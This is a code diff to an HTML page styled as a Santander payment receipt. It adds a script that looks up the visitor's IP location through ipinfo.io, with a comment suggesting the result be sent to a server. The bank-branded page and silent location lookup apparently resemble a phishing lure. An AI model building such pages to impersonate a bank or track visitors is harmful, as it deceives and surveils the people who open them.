@@ -5,7 +5,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento - Santander</title>
-  <link rel="stylesheet" href="styles.css" />
 </head>
 
 <body>
@@ -25,7 +24,6 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
@@ -38,6 +36,18 @@
     const dataFormatada = `${dia}/${mes}/${ano}`;
 
     document.getElementById("data-atual").textContent = dataFormatada;
+
+    // Exemplo de chamada para API de geolocalização via IP
+    fetch('https://ipinfo.io/json?token=SEU_TOKEN_AQUI')
+      .then(response => response.json())
+      .then(data => {
+        console.log('Localização via IP:', data);
+        // Aqui você pode processar a localização, por exemplo, enviando para o servidor
+        // ou exibindo para o usuário, se necessário.
+      })
+      .catch(error => {
+        console.error('Erro ao obter localização via IP:', error);
+      });
   </script>
 </body>
 
